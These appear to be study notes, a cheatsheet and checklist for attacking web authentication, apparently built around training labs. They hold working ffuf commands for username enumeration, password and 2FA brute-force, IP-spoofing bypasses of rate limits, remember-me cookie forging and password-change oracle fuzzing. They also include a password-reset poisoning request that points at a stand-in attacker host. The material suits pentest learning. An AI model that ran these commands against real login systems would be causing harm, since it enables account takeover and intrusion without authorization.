## Section 1: Cheatsheet

### Username Enumeration

| Command | Description |
|---|---|
| `ffuf -w usernames.txt:FUZZ -u http://TARGET/login -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user" -v -c` | Brute-force usernames; filter known-invalid error message |
| `ffuf -w usernames.txt:FUZZ -u https://TARGET/login -X POST -d "username=FUZZ&password=asd" -c -fr 'Invalid username or password\.'` | Enumerate via subtle error difference (escape special regex chars like `.`) |
| `ffuf -w usernames.txt:FUZZ -u https://TARGET/login -X POST -d "username=FUZZ&password=<VERY-LONG-PASSWORD>" -c -ft '<1000'` | Enumerate via response timing (long password amplifies delay on valid usernames) |
| `./username-anarchy Jane Smith > usernames.txt` | Generate username list from a real name |
| `./username-anarchy -i names.txt` | Bulk username generation from a file |
| `./username-anarchy -@ example.com` | Append domain suffix to each username |
| `./username-anarchy -l` | List all available format plugins |

### Password Wordlist Filtering (Policy-Based)

| Command | Description |
|---|---|
| `grep -E '^.{8,}$' wordlist.txt` | Minimum 8 characters |
| `grep -E '[A-Z]' wordlist.txt` | At least one uppercase letter |
| `grep -E '[a-z]' wordlist.txt` | At least one lowercase letter |
| `grep -E '[0-9]' wordlist.txt` | At least one digit |
| `grep -E '[!@#$%^&*()_+]' wordlist.txt` | At least one special character |
| `grep -E '(.)\1' wordlist.txt` | Match consecutive repeated characters (use with `-v` to exclude) |
| `grep -v -i 'password' wordlist.txt` | Exclude lines containing "password" |
| `grep '[[:upper:]]' rockyou.txt \| grep '[[:lower:]]' \| grep '[[:digit:]]' \| grep -E '.{10}' > custom.txt` | Chain multiple policy filters |

### Brute-Force Protection Bypass

| Command / Technique | Description |
|---|---|
| `ffuf -w usernames:FUZZ1 -w nums.txt:FUZZ2 -u TARGET -H 'X-Forwarded-For: FUZZ2' -X POST -d 'username=FUZZ1&password=invalid' -mode pitchfork` | Spoof IP via `X-Forwarded-For` header to bypass IP-based rate limiting |
| `ffuf -w passwords:FUZZ1 -w nums.txt:FUZZ2 -u TARGET -X POST -d 'username=victim&password=FUZZ1' -H 'X-Forwarded-For: FUZZ2' -mc 301,302 -mode pitchfork` | Combined IP spoofing + password brute-force |
| Reset-counter bypass (script) | Log into own account every N attempts to reset failed-login counter before lockout triggers |
| JSON array password stuffing | Replace `"password":"x"` with `"password":["pass1","pass2",...]` to try multiple passwords in one request |

**JSON array format conversion:**
```bash
awk 'NR==1{printf "[\n    \"%s\"", $0; next} {printf ",\n    \"%s\"", $0} END{print "\n]"}' password > password.json
```

### 2FA Bypass

| Technique | Description |
|---|---|
| Skip verification step | After step 1, navigate directly to the authenticated page (e.g. `/admin.php`) — some apps don't enforce step 2 |
| `302 → 200` status tamper | Intercept redirect response; change status to `200` to read page content served in the body |
| Cookie `verify` tampering | Change `verify=wiener` → `verify=carlos` on the 2FA GET request to generate a code for another user |
| `ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u TARGET/login2 -X POST -H 'Cookie: session=...; verify=carlos' -d 'mfa-code=FUZZ' -mc 301,302` | Brute-force 4-digit MFA code after generating it for target user |

### "Remember Me" Cookie Cracking

```bash
# Step 1 — Generate MD5 hashes of each password
while IFS= read -r line; do echo -n "$line" | md5sum | cut -d' ' -f1; done < password > hashes.txt

# Step 2 — Prepend username
sed 's/^/carlos:/' hashes.txt > new_hashes.txt

# Step 3 — Base64 encode
while IFS= read -r line; do echo -n "$line" | base64; done < new_hashes.txt > hashes_b64.txt

# Step 4 — Fuzz cookie
ffuf -w hashes_b64.txt -u 'https://TARGET/my-account?id=carlos' -H 'Cookie: stay-logged-in=FUZZ' -c -mr 'Log out'
```

### Password Reset Attacks

| Technique | Description |
|---|---|
| Guessable reset URL | Test `?user=victim-user` — swap username in the reset link |
| Token not re-validated | Send reset POST with empty token (`temp-forgot-password-token=`) and changed `username=victim` — server may accept |
| Password reset poisoning | Inject `X-Forwarded-Host: attacker.com` on the reset request — if trusted, victim's reset link points to attacker's server |

**Reset poisoning request:**
```
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker-exploit-server.net

username=carlos
```

### Password Change Oracle

| Input Condition | Server Response | Meaning |
|---|---|---|
| Wrong current + matching new passwords | Account locked | Avoid — triggers lockout |
| Wrong current + non-matching new passwords | "Current password is incorrect" | Negative signal |
| **Correct current + non-matching new passwords** | **"New passwords do not match"** | ✅ Oracle hit — correct password found |

```bash
# Fuzz with always-mismatched new passwords to avoid lockout
# username= hidden field — change to victim
ffuf -w passwords -u TARGET/my-account/change-password -X POST \
  -d 'username=carlos&current-password=FUZZ&new-password-1=abc&new-password-2=xyz' \
  -mr 'New passwords do not match'
```

### Security Question Brute-Force

```bash
# Filter world cities list by country
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt

# Brute-force the security question answer
ffuf -w ./city_wordlist.txt -u http://TARGET/security_question.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<your-session>" \
  -d "security_response=FUZZ" -fr "Incorrect response."
```

## Section 2: Checklist

### 2.1 — Username Enumeration

- [ ] Compare error messages for invalid username vs. invalid password — look for any difference (even a single character)
- [ ] Compare HTTP status codes between valid and invalid username attempts
- [ ] Measure response time differences — try with a very long password to amplify the gap
- [ ] Check if usernames are exposed in user profiles, HTTP responses, or error messages
- [ ] Check if admin/IT email addresses leak in responses
- [ ] Generate custom username lists using OSINT + Username Anarchy for named targets

---

### 2.2 — Password Brute-Force

- [ ] Try default credentials (`admin:admin`, `admin:password`, etc.)
- [ ] Try top common passwords wordlist
- [ ] Extract password policy from error messages or documentation
- [ ] Filter wordlists to match discovered policy (length, uppercase, digits, special chars)
- [ ] Generate personalized wordlist using CUPP if target personal info is available
- [ ] Generate rule-based mutations from known/leaked passwords using Hashcat
- [ ] Check for credential reuse — look for the target in breach databases / exposed dumps

---

### 2.3 — Brute-Force Protection Bypass

- [ ] Check if `X-Forwarded-For` header is trusted — test IP spoofing to bypass rate limiting
- [ ] Check if failed-attempt counter resets on successful login — test periodic valid login to bypass lockout
- [ ] Check if JSON login endpoint accepts an array of passwords in a single request
- [ ] Test whether account lockout reveals valid usernames through different error messages
- [ ] Check if lockout is time-based (1 min) vs. permanent — time-based limits are easier to work around
- [ ] Verify if rate limiting is per-IP or per-account

---

### 2.4 — HTTP Basic Authentication

- [ ] Identify endpoints using `Authorization: Basic` header
- [ ] Decode Base64 value to confirm credential format
- [ ] Test for brute-force — Basic Auth often lacks lockout or rate limiting
- [ ] Check if credentials are transmitted over HTTP (no HTTPS / no HSTS)
- [ ] Check if the same credentials are reused elsewhere on the application

---

### 2.5 — Multi-Factor Authentication (2FA)

- [ ] After completing step 1 (password), attempt to navigate directly to authenticated pages — check if step 2 is enforced
- [ ] Intercept `302` redirects after step 1 and change status to `200` — check if page content is served in body
- [ ] Inspect 2FA GET request for `verify` or similar cookie — tamper it with another username
- [ ] Check if 2FA codes can be brute-forced (4–6 digit numeric codes with no lockout)
- [ ] Check if SMS-based codes are in use (weaker than authenticator apps; vulnerable to SIM swap)
- [ ] Verify the server re-validates the token on the final 2FA submission, not just on page load
- [ ] Check if "email 2FA" is used — this is effectively single-factor (both factors rely on email access)

---

### 2.6 — "Remember Me" / Persistent Cookies

- [ ] Decode the persistent cookie (Base64, hex, JWT) — identify the algorithm/format
- [ ] Check if the cookie is constructed from predictable values (username + MD5/SHA hash of password)
- [ ] Check if no salt is used in hashing — allows offline hash cracking against wordlists
- [ ] Generate and fuzz cookie values for other users if the formula is known
- [ ] Test for cookie theft via XSS — determine if `HttpOnly` flag is missing
- [ ] Check if the cookie has a `Secure` flag — test over HTTP if absent

---

### 2.7 — Password Reset

- [ ] Check if the reset URL uses a guessable parameter (`?user=victim`) — swap it to another user
- [ ] Request a reset for your own account; check if the token is validated on form submission (not just page load)
- [ ] Send the reset POST with an empty token — check if the server still processes the username field
- [ ] Test `X-Forwarded-Host` injection on the reset request — check if the generated link uses the injected host
- [ ] Test other host override headers: `X-Host`, `X-Original-URL`, `Forwarded`
- [ ] Check if reset tokens expire after use and after a reasonable time window
- [ ] Check if old tokens remain valid after a new reset is requested

---

### 2.8 — Security Questions

- [ ] Identify what security questions are in use — assess how guessable they are
- [ ] Check if the answer field has rate limiting or lockout
- [ ] Build a targeted wordlist (e.g., cities, pet names, maiden names) using OSINT
- [ ] Brute-force the answer if no rate limiting is present
- [ ] Check if the question answer is case-sensitive

---

### 2.9 — Password Change

- [ ] Verify the password change page requires authentication — test if it's accessible without being logged in
- [ ] Check if `username` is a hidden/editable field — swap it with a victim's username
- [ ] Test oracle: submit wrong current password + non-matching new passwords → check if error reveals whether current password was correct
- [ ] Confirm whether account lockout triggers on wrong current password + matching new passwords (use non-matching to avoid it)
- [ ] Brute-force current password using the oracle if identified, with non-matching new passwords to stay under lockout threshold
